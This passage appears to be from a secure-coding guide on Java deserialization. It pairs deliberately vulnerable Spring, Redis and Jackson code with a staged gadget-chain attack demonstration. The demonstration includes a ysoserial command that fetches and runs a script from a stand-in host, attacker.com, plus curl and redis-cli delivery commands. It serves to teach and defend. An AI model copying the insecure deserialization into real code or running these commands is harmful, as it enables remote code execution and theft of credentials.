## Vulnerable Implementation

```java
// VULNERABLE: Using ObjectInputStream with Redis caching
package com.example.user;

import org.springframework.data.redis.connection.RedisConnectionFactory;
import org.springframework.data.redis.core.RedisTemplate;
import org.springframework.stereotype.Service;
import java.io.*;
import java.util.Base64;

@Service
public class UserCacheService {

    private final RedisTemplate<String, String> redisTemplate;

    public UserCacheService(RedisTemplate<String, String> redisTemplate) {
        this.redisTemplate = redisTemplate;
    }

    public void cacheUser(User user, String userId) throws IOException {
        try {
            // VULNERABLE: Serialize user object using ObjectOutputStream
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(user);  // Serializes full object graph
            oos.close();

            // Store in Redis as Base64
            String serialized = Base64.getEncoder().encodeToString(baos.toByteArray());
            redisTemplate.opsForValue().set("user:" + userId, serialized);
        } catch (IOException e) {
            throw new RuntimeException("Cache error", e);
        }
    }

    public User getCachedUser(String userId) throws IOException, ClassNotFoundException {
        try {
            // VULNERABLE: Deserialize untrusted data from Redis
            String serialized = redisTemplate.opsForValue().get("user:" + userId);
            if (serialized == null) return null;

            byte[] data = Base64.getDecoder().decode(serialized);
            ByteArrayInputStream bais = new ByteArrayInputStream(data);
            ObjectInputStream ois = new ObjectInputStream(bais);

            // RCE HAPPENS HERE: readObject() invokes gadget chains
            User user = (User) ois.readObject();
            ois.close();

            return user;
        } catch (IOException | ClassNotFoundException e) {
            throw new RuntimeException("Deserialization error", e);
        }
    }
}

// VULNERABLE POJO: Implements Serializable (must for ObjectInputStream)
public class User implements Serializable {
    private static final long serialVersionUID = 1L;

    private String id;
    private String name;
    private String email;

    public User() {}
    public User(String id, String name, String email) {
        this.id = id;
        this.name = name;
        this.email = email;
    }

    // Getters/Setters
    public String getId() { return id; }
    public void setId(String id) { this.id = id; }

    public String getName() { return name; }
    public void setName(String name) { this.name = name; }

    public String getEmail() { return email; }
    public void setEmail(String email) { this.email = email; }
}

// VULNERABLE: Jackson with default typing enabled
@Configuration
public class JacksonConfig {
    @Bean
    public ObjectMapper objectMapper() {
        ObjectMapper mapper = new ObjectMapper();

        // VULNERABLE: enableDefaultTyping allows arbitrary class deserialization
        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);

        return mapper;
    }
}
```

### Attack Demonstration: Gadget Chain RCE

**Stage 1: Craft Malicious Serialized Gadget Chain**
```bash
# Using ysoserial tool to generate Commons Collections gadget chain
# ysoserial generates serialized object that executes command on deserialization

java -jar ysoserial.jar CommonsCollections6 'wget http://attacker.com/backdoor.sh -O /tmp/b.sh && bash /tmp/b.sh' | base64

# Output: rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0...
```

**Stage 2: Send Malicious Object to Vulnerable Endpoint**
```bash
# If REST API accepts serialized objects (rare but exists):
curl -X POST http://victim.com/api/user/deserialize \
  -H "Content-Type: application/octet-stream" \
  --data-binary @malicious_gadget.bin

# If Redis is compromised or cache poisoned:
# Attacker sends malicious serialized object via SET command
redis-cli -h victim.redis.com
SET user:attacker rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0...
```

**Stage 3: Trigger Deserialization During Cache Lookup**
```bash
# Victim application calls getCachedUser()
# getCachedUser() calls ObjectInputStream.readObject()
# readObject() invokes gadget chain methods
# Gadget chain ultimately calls Runtime.getRuntime().exec()
# Attacker's command executes on server
```

**Stage 4: Full Compromise**
```bash
# Backdoor downloaded and executed
wget http://attacker.com/backdoor.sh -O /tmp/b.sh
bash /tmp/b.sh

# Result:
# - Reverse shell opened to attacker
# - Data exfiltrated (users, database credentials, API keys)
# - Lateral movement to internal systems
# - Persistence mechanisms installed (cron, systemd services)
```

